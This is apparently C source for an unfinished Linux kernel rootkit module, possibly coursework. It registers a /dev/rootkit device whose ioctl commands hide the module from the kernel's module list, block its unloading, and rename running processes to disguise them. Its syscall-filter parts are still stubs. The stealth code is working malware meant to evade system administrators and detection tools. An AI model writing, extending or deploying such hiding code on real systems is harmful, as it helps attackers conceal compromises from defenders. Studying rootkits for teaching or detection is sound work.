#include "rootkit.h"

#include <asm/syscall.h>
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

/* The rootkit module should be visible by default. */
static bool module_hidden = false;
static struct list_head *prev_module_entry = NULL;

static void toggle_module_visibility(void) {
    if (!module_hidden) {
        prev_module_entry = THIS_MODULE->list.prev;
        try_module_get(THIS_MODULE); // Prevent unloading
        // Hide module: remove from list
        list_del(&THIS_MODULE->list);
        module_hidden = true;
        
        printk(KERN_INFO "Module hidden\n");
    } else {
        if (prev_module_entry)
            list_add(&THIS_MODULE->list, prev_module_entry);
        module_hidden = false;
        module_put(THIS_MODULE); // Balance reference count

        printk(KERN_INFO "Module unhidden\n");
    }
}

static void masquerade_proc(struct masq_proc *proc) {
    struct task_struct *task;
    char *new_name = proc->new_name;
    char *orig_name = proc->orig_name;

    // new name must be shorter than original name
    if (strnlen(new_name, MASQ_LEN) >= strnlen(orig_name, MASQ_LEN)) {
        printk(KERN_WARNING "New name must be shorter than original name\n");
        return;
    }

    // iterate over all processes and masquerade name if possible
    for_each_process(task) {
        if (strcmp(task->comm, orig_name) == 0) {
            strcpy(task->comm, new_name);
        }
    }
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    long ret = 0;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        toggle_module_visibility();
        break;
    case IOCTL_MOD_MASQ:
        struct masq_proc_req req;
        struct masq_proc *procs;

        // copy request from user space
        if (copy_from_user(&req, (void *)arg, sizeof(req))) {
            ret = -EFAULT;
            break;
        }

        // allocate memory for procs
        procs = kmalloc(req.len * sizeof(struct masq_proc), GFP_KERNEL);
        if (!procs) {
            ret = -ENOMEM;
            break;
        }

        // copy procs from user space
        if (copy_from_user(procs, req.list, req.len * sizeof(struct masq_proc))) {
            kfree(procs);
            ret = -EFAULT;
            break;
        }

        // masquerade each process
        for (int i = 0; i < req.len; i++) {
            masquerade_proc(&procs[i]);
        }

        kfree(procs);
        break;
    case IOCTL_ADD_FILTER:
        // do something
        break;
    case IOCTL_REMOVE_FILTER:
        // do something
        break;
    default:
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void) {
    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    return 0;
}

static void __exit rootkit_exit(void) {
    // TODO: unhook syscall and cleanup syscall filter list

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
